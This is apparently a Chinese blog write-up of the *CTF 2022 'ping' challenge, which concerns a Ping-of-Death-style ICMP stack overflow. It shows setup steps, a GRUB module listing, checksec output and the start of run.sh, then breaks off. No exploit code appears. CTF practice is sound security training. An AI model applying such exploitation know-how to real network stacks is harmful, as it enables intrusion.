<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="ping 复现 后缀为 .iso，代表没有使用常规的 busybox 文件系统，使用如下命令进行挂载： 1➜  starctf2022_ping sudo mount kernel.iso rootfs kernel.iso 的文件结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434">
<meta property="og:type" content="article">
<meta property="og:title" content="死亡之ping+ICMP栈溢出">
<meta property="og:url" content="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="ping 复现 后缀为 .iso，代表没有使用常规的 busybox 文件系统，使用如下命令进行挂载： 1➜  starctf2022_ping sudo mount kernel.iso rootfs kernel.iso 的文件结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1657783449606.png">
<meta property="og:image" content="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/20141022142620839.png">
<meta property="og:image" content="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1658225141822.png">
<meta property="og:image" content="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1658226065509.png">
<meta property="article:published_time" content="2022-07-19T14:26:54.000Z">
<meta property="article:modified_time" content="2022-07-19T14:29:20.000Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="ping pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1657783449606.png">

<link rel="canonical" href="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>死亡之ping+ICMP栈溢出 | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          死亡之ping+ICMP栈溢出
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-19 22:26:54 / Modified: 22:29:20" itemprop="dateCreated datePublished" datetime="2022-07-19T22:26:54+08:00">2022-07-19</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>19k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>18 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>ping 复现</strong></p>
<p>后缀为 .iso，代表没有使用常规的 busybox 文件系统，使用如下命令进行挂载：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  starctf2022_ping sudo mount kernel.iso rootfs</span><br></pre></td></tr></table></figure>
<p>kernel.iso 的文件结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\ywx813\Desktop\<span class="number">2022</span>暑假复现\starctf2022_ping\rootfs&gt;tree /f</span><br><span class="line">卷 OS 的文件夹 PATH 列表</span><br><span class="line">卷序列号为 <span class="number">1</span>AD1<span class="number">-822</span>C</span><br><span class="line">C:.</span><br><span class="line">│  boot.catalog</span><br><span class="line">│</span><br><span class="line">├─boot</span><br><span class="line">│  │  kernel.elf</span><br><span class="line">│  │</span><br><span class="line">│  └─grub</span><br><span class="line">│      │  grub.cfg</span><br><span class="line">│      │</span><br><span class="line">│      ├─fonts</span><br><span class="line">│      │      unicode.pf2</span><br><span class="line">│      │</span><br><span class="line">│      ├─i386-pc</span><br><span class="line">│      │      <span class="number">915</span>resolution.mod</span><br><span class="line">│      │      acpi.mod</span><br><span class="line">│      │      adler32.mod</span><br><span class="line">│      │      affs.mod</span><br><span class="line">│      │      afs.mod</span><br><span class="line">│      │      ahci.mod</span><br><span class="line">│      │      all_video.mod</span><br><span class="line">│      │      aout.mod</span><br><span class="line">│      │      archelp.mod</span><br><span class="line">│      │      ata.mod</span><br><span class="line">│      │      at_keyboard.mod</span><br><span class="line">│      │      backtrace.mod</span><br><span class="line">│      │      bfs.mod</span><br><span class="line">│      │      biosdisk.mod</span><br><span class="line">│      │      bitmap.mod</span><br><span class="line">│      │      bitmap_scale.mod</span><br><span class="line">│      │      blocklist.mod</span><br><span class="line">│      │      boot.mod</span><br><span class="line">│      │      bsd.mod</span><br><span class="line">│      │      bswap_test.mod</span><br><span class="line">│      │      btrfs.mod</span><br><span class="line">│      │      bufio.mod</span><br><span class="line">│      │      cat.mod</span><br><span class="line">│      │      cbfs.mod</span><br><span class="line">│      │      cbls.mod</span><br><span class="line">│      │      cbmemc.mod</span><br><span class="line">│      │      cbtable.mod</span><br><span class="line">│      │      cbtime.mod</span><br><span class="line">│      │      chain.mod</span><br><span class="line">│      │      cmdline_cat_test.mod</span><br><span class="line">│      │      cmosdump.mod</span><br><span class="line">│      │      cmostest.mod</span><br><span class="line">│      │      cmp.mod</span><br><span class="line">│      │      cmp_test.mod</span><br><span class="line">│      │      command.lst</span><br><span class="line">│      │      configfile.mod</span><br><span class="line">│      │      cpio.mod</span><br><span class="line">│      │      cpio_be.mod</span><br><span class="line">│      │      cpuid.mod</span><br><span class="line">│      │      crc64.mod</span><br><span class="line">│      │      crypto.lst</span><br><span class="line">│      │      crypto.mod</span><br><span class="line">│      │      cryptodisk.mod</span><br><span class="line">│      │      cs5536.mod</span><br><span class="line">│      │      ctz_test.mod</span><br><span class="line">│      │      date.mod</span><br><span class="line">│      │      datehook.mod</span><br><span class="line">│      │      datetime.mod</span><br><span class="line">│      │      disk.mod</span><br><span class="line">│      │      diskfilter.mod</span><br><span class="line">│      │      div.mod</span><br><span class="line">│      │      div_test.mod</span><br><span class="line">│      │      dm_nv.mod</span><br><span class="line">│      │      drivemap.mod</span><br><span class="line">│      │      echo.mod</span><br><span class="line">│      │      efiemu.mod</span><br><span class="line">│      │      efiemu32.o</span><br><span class="line">│      │      efiemu64.o</span><br><span class="line">│      │      ehci.mod</span><br><span class="line">│      │      elf.mod</span><br><span class="line">│      │      eltorito.img</span><br><span class="line">│      │      eval.mod</span><br><span class="line">│      │      exfat.mod</span><br><span class="line">│      │      exfctest.mod</span><br><span class="line">│      │      ext2.mod</span><br><span class="line">│      │      extcmd.mod</span><br><span class="line">│      │      f2fs.mod</span><br><span class="line">│      │      fat.mod</span><br><span class="line">│      │      file.mod</span><br><span class="line">│      │      font.mod</span><br><span class="line">│      │      freedos.mod</span><br><span class="line">│      │      fs.lst</span><br><span class="line">│      │      fshelp.mod</span><br><span class="line">│      │      functional_test.mod</span><br><span class="line">│      │      gcry_arcfour.mod</span><br><span class="line">│      │      gcry_blowfish.mod</span><br><span class="line">│      │      gcry_camellia.mod</span><br><span class="line">│      │      gcry_cast5.mod</span><br><span class="line">│      │      gcry_crc.mod</span><br><span class="line">│      │      gcry_des.mod</span><br><span class="line">│      │      gcry_dsa.mod</span><br><span class="line">│      │      gcry_idea.mod</span><br><span class="line">│      │      gcry_md4.mod</span><br><span class="line">│      │      gcry_md5.mod</span><br><span class="line">│      │      gcry_rfc2268.mod</span><br><span class="line">│      │      gcry_rijndael.mod</span><br><span class="line">│      │      gcry_rmd160.mod</span><br><span class="line">│      │      gcry_rsa.mod</span><br><span class="line">│      │      gcry_seed.mod</span><br><span class="line">│      │      gcry_serpent.mod</span><br><span class="line">│      │      gcry_sha1.mod</span><br><span class="line">│      │      gcry_sha256.mod</span><br><span class="line">│      │      gcry_sha512.mod</span><br><span class="line">│      │      gcry_tiger.mod</span><br><span class="line">│      │      gcry_twofish.mod</span><br><span class="line">│      │      gcry_whirlpool.mod</span><br><span class="line">│      │      gdb.mod</span><br><span class="line">│      │      geli.mod</span><br><span class="line">│      │      gettext.mod</span><br><span class="line">│      │      gfxmenu.mod</span><br><span class="line">│      │      gfxterm.mod</span><br><span class="line">│      │      gfxterm_background.mod</span><br><span class="line">│      │      gfxterm_menu.mod</span><br><span class="line">│      │      gptsync.mod</span><br><span class="line">│      │      gzio.mod</span><br><span class="line">│      │      halt.mod</span><br><span class="line">│      │      hashsum.mod</span><br><span class="line">│      │      hdparm.mod</span><br><span class="line">│      │      hello.mod</span><br><span class="line">│      │      help.mod</span><br><span class="line">│      │      hexdump.mod</span><br><span class="line">│      │      hfs.mod</span><br><span class="line">│      │      hfsplus.mod</span><br><span class="line">│      │      hfspluscomp.mod</span><br><span class="line">│      │      http.mod</span><br><span class="line">│      │      hwmatch.mod</span><br><span class="line">│      │      iorw.mod</span><br><span class="line">│      │      iso9660.mod</span><br><span class="line">│      │      jfs.mod</span><br><span class="line">│      │      jpeg.mod</span><br><span class="line">│      │      keylayouts.mod</span><br><span class="line">│      │      keystatus.mod</span><br><span class="line">│      │      ldm.mod</span><br><span class="line">│      │      legacycfg.mod</span><br><span class="line">│      │      legacy_password_test.mod</span><br><span class="line">│      │      linux.mod</span><br><span class="line">│      │      linux16.mod</span><br><span class="line">│      │      loadenv.mod</span><br><span class="line">│      │      loopback.mod</span><br><span class="line">│      │      ls.mod</span><br><span class="line">│      │      lsacpi.mod</span><br><span class="line">│      │      lsapm.mod</span><br><span class="line">│      │      lsmmap.mod</span><br><span class="line">│      │      lspci.mod</span><br><span class="line">│      │      luks.mod</span><br><span class="line">│      │      lvm.mod</span><br><span class="line">│      │      lzopio.mod</span><br><span class="line">│      │      macbless.mod</span><br><span class="line">│      │      macho.mod</span><br><span class="line">│      │      mda_text.mod</span><br><span class="line">│      │      mdraid09.mod</span><br><span class="line">│      │      mdraid09_be.mod</span><br><span class="line">│      │      mdraid1x.mod</span><br><span class="line">│      │      memdisk.mod</span><br><span class="line">│      │      memrw.mod</span><br><span class="line">│      │      minicmd.mod</span><br><span class="line">│      │      minix.mod</span><br><span class="line">│      │      minix2.mod</span><br><span class="line">│      │      minix2_be.mod</span><br><span class="line">│      │      minix3.mod</span><br><span class="line">│      │      minix3_be.mod</span><br><span class="line">│      │      minix_be.mod</span><br><span class="line">│      │      mmap.mod</span><br><span class="line">│      │      moddep.lst</span><br><span class="line">│      │      modinfo.sh</span><br><span class="line">│      │      morse.mod</span><br><span class="line">│      │      mpi.mod</span><br><span class="line">│      │      msdospart.mod</span><br><span class="line">│      │      multiboot.mod</span><br><span class="line">│      │      multiboot2.mod</span><br><span class="line">│      │      mul_test.mod</span><br><span class="line">│      │      nativedisk.mod</span><br><span class="line">│      │      net.mod</span><br><span class="line">│      │      newc.mod</span><br><span class="line">│      │      nilfs2.mod</span><br><span class="line">│      │      normal.mod</span><br><span class="line">│      │      ntfs.mod</span><br><span class="line">│      │      ntfscomp.mod</span><br><span class="line">│      │      ntldr.mod</span><br><span class="line">│      │      odc.mod</span><br><span class="line">│      │      offsetio.mod</span><br><span class="line">│      │      ohci.mod</span><br><span class="line">│      │      partmap.lst</span><br><span class="line">│      │      parttool.lst</span><br><span class="line">│      │      parttool.mod</span><br><span class="line">│      │      part_acorn.mod</span><br><span class="line">│      │      part_amiga.mod</span><br><span class="line">│      │      part_apple.mod</span><br><span class="line">│      │      part_bsd.mod</span><br><span class="line">│      │      part_dfly.mod</span><br><span class="line">│      │      part_dvh.mod</span><br><span class="line">│      │      part_gpt.mod</span><br><span class="line">│      │      part_msdos.mod</span><br><span class="line">│      │      part_plan.mod</span><br><span class="line">│      │      part_sun.mod</span><br><span class="line">│      │      part_sunpc.mod</span><br><span class="line">│      │      password.mod</span><br><span class="line">│      │      password_pbkdf2.mod</span><br><span class="line">│      │      pata.mod</span><br><span class="line">│      │      pbkdf2.mod</span><br><span class="line">│      │      pbkdf2_test.mod</span><br><span class="line">│      │      pci.mod</span><br><span class="line">│      │      pcidump.mod</span><br><span class="line">│      │      pgp.mod</span><br><span class="line">│      │      plan9.mod</span><br><span class="line">│      │      play.mod</span><br><span class="line">│      │      png.mod</span><br><span class="line">│      │      <span class="built_in">priority_queue</span>.mod</span><br><span class="line">│      │      probe.mod</span><br><span class="line">│      │      procfs.mod</span><br><span class="line">│      │      progress.mod</span><br><span class="line">│      │      pxe.mod</span><br><span class="line">│      │      pxechain.mod</span><br><span class="line">│      │      raid5rec.mod</span><br><span class="line">│      │      raid6rec.mod</span><br><span class="line">│      │      random.mod</span><br><span class="line">│      │      rdmsr.mod</span><br><span class="line">│      │      read.mod</span><br><span class="line">│      │      reboot.mod</span><br><span class="line">│      │      regexp.mod</span><br><span class="line">│      │      reiserfs.mod</span><br><span class="line">│      │      relocator.mod</span><br><span class="line">│      │      romfs.mod</span><br><span class="line">│      │      scsi.mod</span><br><span class="line">│      │      search.mod</span><br><span class="line">│      │      search_fs_file.mod</span><br><span class="line">│      │      search_fs_uuid.mod</span><br><span class="line">│      │      search_label.mod</span><br><span class="line">│      │      sendkey.mod</span><br><span class="line">│      │      serial.mod</span><br><span class="line">│      │      setjmp.mod</span><br><span class="line">│      │      setjmp_test.mod</span><br><span class="line">│      │      setpci.mod</span><br><span class="line">│      │      sfs.mod</span><br><span class="line">│      │      shift_test.mod</span><br><span class="line">│      │      signature_test.mod</span><br><span class="line">│      │      sleep.mod</span><br><span class="line">│      │      sleep_test.mod</span><br><span class="line">│      │      smbios.mod</span><br><span class="line">│      │      spkmodem.mod</span><br><span class="line">│      │      squash4.mod</span><br><span class="line">│      │      strtoull_test.mod</span><br><span class="line">│      │      syslinuxcfg.mod</span><br><span class="line">│      │      tar.mod</span><br><span class="line">│      │      terminal.lst</span><br><span class="line">│      │      terminal.mod</span><br><span class="line">│      │      terminfo.mod</span><br><span class="line">│      │      test.mod</span><br><span class="line">│      │      testload.mod</span><br><span class="line">│      │      testspeed.mod</span><br><span class="line">│      │      test_blockarg.mod</span><br><span class="line">│      │      tftp.mod</span><br><span class="line">│      │      tga.mod</span><br><span class="line">│      │      time.mod</span><br><span class="line">│      │      tr.mod</span><br><span class="line">│      │      trig.mod</span><br><span class="line">│      │      <span class="literal">true</span>.mod</span><br><span class="line">│      │      truecrypt.mod</span><br><span class="line">│      │      udf.mod</span><br><span class="line">│      │      ufs1.mod</span><br><span class="line">│      │      ufs1_be.mod</span><br><span class="line">│      │      ufs2.mod</span><br><span class="line">│      │      uhci.mod</span><br><span class="line">│      │      usb.mod</span><br><span class="line">│      │      usbms.mod</span><br><span class="line">│      │      usbserial_common.mod</span><br><span class="line">│      │      usbserial_ftdi.mod</span><br><span class="line">│      │      usbserial_pl2303.mod</span><br><span class="line">│      │      usbserial_usbdebug.mod</span><br><span class="line">│      │      usbtest.mod</span><br><span class="line">│      │      usb_keyboard.mod</span><br><span class="line">│      │      vbe.mod</span><br><span class="line">│      │      verifiers.mod</span><br><span class="line">│      │      vga.mod</span><br><span class="line">│      │      vga_text.mod</span><br><span class="line">│      │      video.lst</span><br><span class="line">│      │      video.mod</span><br><span class="line">│      │      videoinfo.mod</span><br><span class="line">│      │      videotest.mod</span><br><span class="line">│      │      videotest_checksum.mod</span><br><span class="line">│      │      video_bochs.mod</span><br><span class="line">│      │      video_cirrus.mod</span><br><span class="line">│      │      video_colors.mod</span><br><span class="line">│      │      video_fb.mod</span><br><span class="line">│      │      wrmsr.mod</span><br><span class="line">│      │      xfs.mod</span><br><span class="line">│      │      xnu.mod</span><br><span class="line">│      │      xnu_uuid.mod</span><br><span class="line">│      │      xnu_uuid_test.mod</span><br><span class="line">│      │      xzio.mod</span><br><span class="line">│      │      zfs.mod</span><br><span class="line">│      │      zfscrypt.mod</span><br><span class="line">│      │      zfsinfo.mod</span><br><span class="line">│      │      zstd.mod</span><br><span class="line">│      │</span><br><span class="line">│      └─roms</span><br><span class="line">└─[BOOT]</span><br><span class="line">        Boot-NoEmul.img</span><br></pre></td></tr></table></figure>
<p>对 kernel.elf 进行检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kernel.elf: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), statically linked, stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x100000</span>)</span></span></span><br><span class="line"><span class="function">    RWX:      Has RWX segments</span></span><br></pre></td></tr></table></figure>
<ul>
<li>32位，statically，全关</li>
</ul>
<p>不是常规的 kernel pwn，看来只能从 run.sh 入手了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  starctf2022_ping cat run.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap100 -u nobody </span><br><span 